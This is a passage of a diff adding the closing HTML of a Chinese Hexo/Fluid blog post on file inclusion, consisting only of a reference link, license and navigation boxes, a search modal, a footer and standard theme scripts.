+<p>参考博客：<a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_43625917/article/details/99865511?spm=1001.2014.3001.5501">博客</a></p>
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>文件包含</div>
+      <div>http://example.com/2023/04/20/文件包含/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>H0ne</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2023年4月20日</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>许可协议</div>
+          <div>
+            
+              
+              
+                <a target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                    <i class="iconfont icon-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2023/04/20/%E6%96%87%E4%BB%B6%E4%BB%BB%E6%84%8F%E8%AF%BB%E5%8F%96/" title="文件任意读取">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">文件任意读取</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2023/04/20/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E5%9F%BA%E7%A1%80%E7%AF%87%20/" title="渗透测试-入门篇">
+                        <span class="hidden-mobile">渗透测试-入门篇</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>目录</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+    </div>
+  
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.0/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.18.2/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+
+  
+<script src="//cdn.jsdelivr.net/gh/EmoryHuang/BlogBeautify@1.1/DynamicRibbon.min.js"></script>
+<script src="//cdn.jsdelivr.net/gh/EmoryHuang/BlogBeautify@1.1/DynamicLine.min.js"></script>
+<script src="//cdn.jsdelivr.net/gh/EmoryHuang/BlogBeautify@1.1/snowflake.min.js"></script>
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+</body>
+</html>
